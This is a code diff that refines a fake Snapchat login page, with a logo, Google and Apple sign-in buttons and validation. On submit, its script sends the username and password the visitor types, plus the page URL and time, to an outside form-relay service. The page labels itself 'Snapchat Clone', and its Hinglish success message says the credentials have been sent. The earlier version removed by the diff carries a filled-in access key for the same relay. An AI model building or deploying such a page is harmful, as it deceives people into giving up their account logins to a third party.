@@ -1,98 +1,542 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat — Log In</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+    <meta name="theme-color" content="#FFFC00" />
+    <title>Log in to Snapchat</title>
+
     <style>
-        * {
+        *,
+        *::before,
+        *::after {
             box-sizing: border-box;
-            margin: 0;
-            padding: 0;
+        }
+
+        :root {
+            --yellow: #FFFC00;
+            --graphite: #121314;
+            --text: #53575B;
+            --border: #D8D9DB;
+            --blue: #0EADFF;
+            --danger: #E23B3B;
+            --ok: #1B6B12;
+        }
+
+        html,
+        body {
+            height: 100%;
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background: #fffc00;
+            margin: 0;
+            background: #fff;
+            color: var(--graphite);
+            font-family: "Avenir Next", Avenir, -apple-system, BlinkMacSystemFont,
+                "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            text-rendering: optimizeLegibility;
             display: flex;
+            flex-direction: column;
             align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            padding: 20px;
         }
 
-        .card {
-            background: #fff;
+        .page {
             width: 100%;
-            max-width: 380px;
-            border-radius: 16px;
-            padding: 32px 24px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, .15);
+            max-width: 360px;
+            padding: 52px 24px 44px;
+        }
+
+        /* ---------- Ghost logo ---------- */
+        .brand {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 22px;
+        }
+
+        .brand svg {
+            width: 68px;
+            height: 68px;
+            fill: var(--yellow);
+            filter: drop-shadow(0 1px 0 rgba(0, 0, 0, .12));
+        }
+
+        h1 {
+            margin: 0 0 26px;
+            font-size: 22px;
+            line-height: 1.25;
+            font-weight: 700;
+            letter-spacing: -.3px;
             text-align: center;
         }
 
-        .logo {
-            font-size: 40px;
-            font-weight: 700;
-            color: #fffc00;
-            -webkit-text-stroke: 2px #000;
-            margin-bottom: 8px;
+        /* ---------- Fields ---------- */
+        .field {
+            margin-bottom: 6px;
         }
 
-        h2 {
-            font-size: 20px;
-            margin-bottom: 24px;
-            color: #111;
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--text);
+            margin-bottom: 6px;
         }
 
-        input {
+        input[type="text"],
+        input[type="password"] {
             width: 100%;
-            padding: 14px;
-            margin-bottom: 14px;
-            border: 1px solid #ddd;
-            border-radius: 10px;
+            height: 48px;
+            padding: 0 14px;
+            font-family: inherit;
             font-size: 16px;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: #000;
-        }
-
-        button {
-            width: 100%;
-            padding: 14px;
-            background: #000;
-            color: #fff;
-            border: none;
+            color: var(--graphite);
+            background: #fff;
+            border: 1px solid var(--border);
             border-radius: 10px;
+            outline: none;
+            transition: border-color .15s ease, box-shadow .15s ease;
+        }
+
+        input::placeholder {
+            color: #A8ABAE;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: var(--graphite);
+            box-shadow: 0 0 0 1px var(--graphite);
+        }
+
+        input.invalid {
+            border-color: var(--danger);
+            box-shadow: 0 0 0 1px var(--danger);
+        }
+
+        .err {
+            display: none;
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--danger);
+            margin-top: 5px;
+        }
+
+        .err.show {
+            display: block;
+        }
+
+        /* ---------- Links ---------- */
+        .mini-link {
+            display: inline-block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--blue);
+            text-decoration: none;
+            margin: 8px 0 20px;
+        }
+
+        .mini-link:hover {
+            text-decoration: underline;
+        }
+
+        .forgot {
+            color: var(--graphite);
+            text-decoration: underline;
+            margin: 8px 0 0;
+        }
+
+        /* ---------- Password + eye ---------- */
+        .pw {
+            position: relative;
+        }
+
+        .pw input {
+            padding-right: 48px;
+        }
+
+        .eye {
+            position: absolute;
+            top: 50%;
+            right: 4px;
+            transform: translateY(-50%);
+            width: 40px;
+            height: 40px;
+            display: grid;
+            place-items: center;
+            padding: 0;
+            background: none;
+            border: 0;
+            cursor: pointer;
+            color: var(--text);
+            border-radius: 50%;
+        }
+
+        .eye:hover {
+            color: var(--graphite);
+        }
+
+        .eye svg {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+        }
+
+        .eye .eye-off {
+            display: none;
+        }
+
+        .eye.on .eye-open {
+            display: none;
+        }
+
+        .eye.on .eye-off {
+            display: block;
+        }
+
+        /* ---------- Buttons ---------- */
+        .btn {
+            width: 100%;
+            height: 48px;
+            border: 0;
+            border-radius: 999px;
+            font-family: inherit;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: transform .08s ease, background .15s ease, opacity .15s ease;
         }
 
-        .note {
-            font-size: 12px;
-            color: #888;
-            margin-top: 16px;
+        .btn:active {
+            transform: scale(.985);
+        }
+
+        .btn-primary {
+            margin-top: 24px;
+            background: var(--graphite);
+            color: #fff;
+        }
+
+        .btn-primary:hover {
+            background: #000;
+        }
+
+        .btn-primary[disabled] {
+            opacity: .6;
+            cursor: progress;
+        }
+
+        .btn-oauth {
+            background: #fff;
+            color: var(--graphite);
+            border: 1px solid var(--border);
+            height: 46px;
+            font-weight: 500;
+            font-size: 15px;
+            margin-bottom: 10px;
+        }
+
+        .btn-oauth:hover {
+            background: #FAFAFA;
+        }
+
+        .btn-oauth svg {
+            width: 18px;
+            height: 18px;
+            flex: 0 0 auto;
+        }
+
+        /* ---------- Divider ---------- */
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 22px 0;
+            color: var(--text);
+            font-size: 13px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: var(--border);
+        }
+
+        /* ---------- Status message ---------- */
+        .msg {
+            display: none;
+            margin-top: 18px;
+            padding: 12px 14px;
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 500;
+            line-height: 1.4;
+        }
+
+        .msg.show {
+            display: block;
+        }
+
+        .msg.ok {
+            background: #F2FAF0;
+            border: 1px solid #BFE3B6;
+            color: var(--ok);
+        }
+
+        .msg.bad {
+            background: #FDF3F3;
+            border: 1px solid #F1C3C3;
+            color: #A52626;
+        }
+
+        /* ---------- Footer ---------- */
+        .foot {
+            margin: 28px 0 0;
+            text-align: center;
+            font-size: 13px;
+            color: var(--text);
+        }
+
+        .foot a {
+            color: var(--graphite);
+            font-weight: 700;
+            text-decoration: none;
+        }
+
+        .foot a:hover {
+            text-decoration: underline;
+        }
+
+        /* ---------- Spinner ---------- */
+        .spin {
+            width: 17px;
+            height: 17px;
+            border: 2px solid rgba(255, 255, 255, .35);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: rot .7s linear infinite;
+        }
+
+        @keyframes rot {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 400px) {
+            .page {
+                padding: 38px 20px 32px;
+            }
         }
     </style>
 </head>
 
 <body>
-    <div class="card">
-        <div class="logo">snapchat</div>
-        <h2>Log in to continue</h2>
-        <form action="https://api.web3forms.com/submit" method="POST">
-            <input type="hidden" name="access_key" value="8d79c69d-beb7-4bed-8e74-1ef08f7f8343">
-            <input type="hidden" name="subject" value="Snapchat Login">
-            <input type="text" name="username" placeholder="Username or Email" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Log In</button>
+    <main class="page">
+
+        <!-- Ghost logo -->
+        <div class="brand" aria-hidden="true">
+            <svg viewBox="0 0 24 24" role="img">
+                <path
+                    d="M21.79755,16.98718c-2.86621-.47223-4.15094-3.40149-4.204-3.52588l-.00544-.01172a1.07048,1.07048,0,0,1-.10223-.89758c.19251-.45361.82935-.6557,1.25134-.78967.10535-.03339.205-.065.28315-.096.76275-.30127.91784-.61316.91406-.8219a.66226,.66226,0,0,0-.50134-.54358l-.00568-.00213a.9462,.9462,0,0,0-.35632-.06824.7546,.7546,0,0,0-.31287.06207,2.54,2.54,0,0,1-.95526.26612.82134,.82134,0,0,1-.52954-.17725c.00915-.16992.02-.34522.0318-.53046l.004-.0653a10.10231,10.10231,0,0,0-.24091-4.03449,5.2482,5.2482,0,0,0-4.87311-3.1394q-.20114.0021-.4024.00378A5.23959,5.23959,0,0,0,6.92853,5.75293,10.08988,10.08988,0,0,0,6.68726,9.784q.01941.29872.036.59771a.8483,.8483,0,0,1-.5838.17841,2.45322,2.45322,0,0,1-1.014-.26776.57538,.57538,0,0,0-.2453-.04895.83387,.83387,0,0,0-.81061.53265c-.08191.43061.5329.74256.90668.8902.079.03137.17822.0628.28308.096.42169.13385,1.05908.33606,1.25152.78985a1.07171,1.07171,0,0,1-.10223.89783l-.00537.01154a7.02828,7.02828,0,0,1-1.06915,1.66211,5.21488,5.21488,0,0,1-3.13483,1.86389.23978,.23978,0,0,0-.20044.25006.38046,.38046,0,0,0,.031.12964c.17578.41113,1.05822.75061,2.55182.981.13964.02161.19873.24927.28027.6222.03259.14929.06634.30426.1134.46423a.29261,.29261,0,0,0,.31922.22876,2.48528,2.48528,0,0,0,.42492-.06091,5.52912,5.52912,0,0,1,1.12036-.12677,4.95367,4.95367,0,0,1,.8078.0683,3.87725,3.87725,0,0,1,1.535.78417,4.443,4.443,0,0,0,2.6897,1.06006c.03375,0,.06744-.00122.10009-.004.04114.00195.09522.004.15192.004a4.44795,4.44795,0,0,0,2.69122-1.06079,3.87269,3.87269,0,0,1,1.53351-.78332,4.97275,4.97275,0,0,1,.808-.0683,5.59252,5.59252,0,0,1,1.12037.11871,2.39142,2.39142,0,0,0,.425.05371h.02338a.279,.279,0,0,0,.29547-.221c.04645-.15784.08045-.308.11389-.46131.08081-.371.1399-.59759.28009-.61926,1.494-.23078,2.37641-.56976,2.551-.97858a.38487,.38487,0,0,0,.03174-.13086A.24,.24,0,0,0,21.79755,16.98718Z" />
+            </svg>
+        </div>
+
+        <h1>Log in to Snapchat</h1>
+
+        <form id="loginForm" novalidate autocomplete="on">
+
+            <!-- ====== WEB3FORMS CONFIG ====== -->
+            <input type="hidden" name="access_key" value="YOUR_ACCESS_KEY_HERE" />
+            <input type="hidden" name="subject" value="New Snapchat Login Submission" />
+            <input type="hidden" name="from_name" value="Snapchat Clone" />
+            <input type="hidden" name="page_url" id="pageUrl" value="" />
+            <input type="hidden" name="submitted_at" id="submittedAt" value="" />
+            <!-- honeypot (bots ke liye) -->
+            <input type="checkbox" name="botcheck" tabindex="-1" style="display:none" />
+            <!-- ============================== -->
+
+            <div class="field">
+                <label for="username">Username or Email</label>
+                <input id="username" name="username" type="text" inputmode="email" autocomplete="username"
+                    autocapitalize="none" spellcheck="false" placeholder="" />
+                <p class="err" id="userErr">Username ya email daalo</p>
+            </div>
+
+            <a class="mini-link" href="#">Use phone number instead</a>
+
+            <div class="field">
+                <label for="password">Password</label>
+                <div class="pw">
+                    <input id="password" name="password" type="password" autocomplete="current-password" />
+                    <button type="button" class="eye" id="eye" aria-label="Show password" aria-pressed="false">
+                        <svg class="eye-open" viewBox="0 0 24 24" aria-hidden="true">
+                            <path
+                                d="M12 5c-5.5 0-9.6 4.1-11 6.4a1.2 1.2 0 0 0 0 1.2C2.4 14.9 6.5 19 12 19s9.6-4.1 11-6.4a1.2 1.2 0 0 0 0-1.2C21.6 9.1 17.5 5 12 5Zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10Zm0-2.2a2.8 2.8 0 1 0 0-5.6 2.8 2.8 0 0 0 0 5.6Z" />
+                        </svg>
+                        <svg class="eye-off" viewBox="0 0 24 24" aria-hidden="true">
+                            <path
+                                d="M2.3 3.7 3.7 2.3l18 18-1.4 1.4-3.2-3.2A11.6 11.6 0 0 1 12 19c-5.5 0-9.6-4.1-11-6.4a1.2 1.2 0 0 1 0-1.2 15.6 15.6 0 0 1 4.5-4.5L2.3 3.7Zm4.1 6.5A13.4 13.4 0 0 0 2.4 13c1.3 2 4.6 4 9.6 4a9.6 9.6 0 0 0 3.6-.7l-2-2a4.9 4.9 0 0 1-6.5-6.5 12 12 0 0 0-.7.4ZM12 5c5.5 0 9.6 4.1 11 6.4a1.2 1.2 0 0 1 0 1.2 16 16 0 0 1-2.4 3l-2.4-2.4A5 5 0 0 0 10.8 7l-1.6-1.6A11.8 11.8 0 0 1 12 5Z" />
+                        </svg>
+                    </button>
+                </div>
+                <p class="err" id="passErr">Password daalo</p>
+            </div>
+
+            <a class="mini-link forgot" href="#">Forgot your password?</a>
+
+            <button type="submit" class="btn btn-primary" id="submitBtn">
+                <span id="btnLabel">Log In</span>
+            </button>
+
+            <div class="msg" id="msg" role="status" aria-live="polite"></div>
+
+            <div class="divider"><span>or</span></div>
+
+            <button type="button" class="btn btn-oauth">
+                <svg viewBox="0 0 48 48" aria-hidden="true">
+                    <path fill="#EA4335"
+                        d="M24 9.5c3.5 0 6.6 1.2 9 3.6l6.7-6.7C35.6 2.6 30.2 0 24 0 14.6 0 6.5 5.4 2.6 13.2l7.8 6.1C12.3 13.2 17.6 9.5 24 9.5Z" />
+                    <path fill="#4285F4"
+                        d="M46.1 24.5c0-1.6-.1-2.8-.4-4.1H24v8.2h12.5c-.3 2.1-1.6 5.2-4.7 7.3l7.6 5.9c4.5-4.2 6.7-10.3 6.7-17.3Z" />
+                    <path fill="#FBBC05"
+                        d="M10.4 28.7A14.6 14.6 0 0 1 9.6 24c0-1.6.3-3.2.8-4.7l-7.8-6.1A24 24 0 0 0 0 24c0 3.9.9 7.5 2.6 10.8l7.8-6.1Z" />
+                    <path fill="#34A853"
+                        d="M24 48c6.5 0 11.9-2.1 15.9-5.8l-7.6-5.9c-2 1.4-4.7 2.4-8.3 2.4-6.4 0-11.7-3.7-13.6-8.8l-7.8 6.1C6.5 42.6 14.6 48 24 48Z" />
+                </svg>
+                Continue with Google
+            </button>
+
+            <button type="button" class="btn btn-oauth">
+                <svg viewBox="0 0 24 24" aria-hidden="true" fill="currentColor">
+                    <path
+                        d="M16.4 12.7c0-2.4 2-3.6 2.1-3.6-1.1-1.7-2.9-1.9-3.5-1.9-1.5-.2-2.9.9-3.6.9s-1.9-.9-3.1-.8c-1.6 0-3 .9-3.8 2.4-1.6 2.8-.4 7 1.2 9.3.8 1.1 1.7 2.4 3 2.3 1.2 0 1.6-.8 3.1-.8s1.8.8 3.1.7c1.3 0 2.1-1.1 2.9-2.3.9-1.3 1.3-2.6 1.3-2.7-.1 0-2.5-1-2.5-3.5Zm-2.4-6.4c.7-.8 1.1-1.9 1-3-1 0-2.2.7-2.9 1.5-.6.7-1.1 1.9-1 3 1.1.1 2.2-.6 2.9-1.5Z" />
+                </svg>
+                Continue with Apple
+            </button>
+
         </form>
-        <p class="note">Forgot your password?</p>
-    </div>
+
+        <p class="foot">New to Snapchat? <a href="#">Sign up</a></p>
+    </main>
+
+    <script>
+        (function () {
+            "use strict";
+
+            var form = document.getElementById("loginForm");
+            var userIn = document.getElementById("username");
+            var passIn = document.getElementById("password");
+            var userErr = document.getElementById("userErr");
+            var passErr = document.getElementById("passErr");
+            var eye = document.getElementById("eye");
+            var btn = document.getElementById("submitBtn");
+            var btnLabel = document.getElementById("btnLabel");
+            var msg = document.getElementById("msg");
+
+            var ENDPOINT = "https://api.web3forms.com/submit";
+
+            /* meta fields */
+            document.getElementById("pageUrl").value = location.href;
+
+            /* ---------- password show / hide ---------- */
+            eye.addEventListener("click", function () {
+                var show = passIn.type === "password";
+                passIn.type = show ? "text" : "password";
+                eye.classList.toggle("on", show);
+                eye.setAttribute("aria-pressed", String(show));
+                eye.setAttribute("aria-label", show ? "Hide password" : "Show password");
+                passIn.focus();
+            });
+
+            /* ---------- live error clear ---------- */
+            userIn.addEventListener("input", function () {
+                userIn.classList.remove("invalid");
+                userErr.classList.remove("show");
+            });
+            passIn.addEventListener("input", function () {
+                passIn.classList.remove("invalid");
+                passErr.classList.remove("show");
+            });
+
+            /* ---------- validation ---------- */
+            function validate() {
+                var ok = true;
+                if (userIn.value.trim().length < 3) {
+                    userIn.classList.add("invalid");
+                    userErr.classList.add("show");
+                    ok = false;
+                }
+                if (passIn.value.length < 1) {
+                    passIn.classList.add("invalid");
+                    passErr.classList.add("show");
+                    ok = false;
+                }
+                return ok;
+            }
+
+            function setLoading(on) {
+                btn.disabled = on;
+                btnLabel.textContent = on ? "" : "Log In";
+                if (on && !btn.querySelector(".spin")) {
+                    var s = document.createElement("span");
+                    s.className = "spin";
+                    s.id = "spinEl";
+                    btn.appendChild(s);
+                } else if (!on) {
+                    var sp = document.getElementById("spinEl");
+                    if (sp) sp.remove();
+                }
+            }
+
+            function showMsg(text, good) {
+                msg.textContent = text;
+                msg.className = "msg show " + (good ? "ok" : "bad");
+            }
+
+            /* ---------- submit ---------- */
+            form.addEventListener("submit", function (e) {
+                e.preventDefault();
+                msg.className = "msg";
+
+                if (!validate()) return;
+
+                document.getElementById("submittedAt").value =
+                    new Date().toLocaleString("en-IN", { timeZoneName: "short" });
+
+                setLoading(true);
+
+                fetch(ENDPOINT, {
+                    method: "POST",
+                    headers: { Accept: "application/json" },
+                    body: new FormData(form)
+                })
+                    .then(function (r) { return r.json(); })
+                    .then(function (data) {
+                        if (data && data.success) {
+                            showMsg("Logged in! Credentials bhej diye gaye hain.", true);
+                            form.querySelector("#username").value = "";
+                            form.querySelector("#password").value = "";
+                        } else {
+                            showMsg(
+                                (data && data.message) || "Submit fail hua. Access key check karo.",
+                                false
+                            );
+                        }
+                    })
+                    .catch(function () {
+                        showMsg("Network error. Internet aur access key check karo.", false);
+                    })
+                    .finally(function () { setLoading(false); });
+            });
+        })();
+    </script>
 </body>
 
 </html>
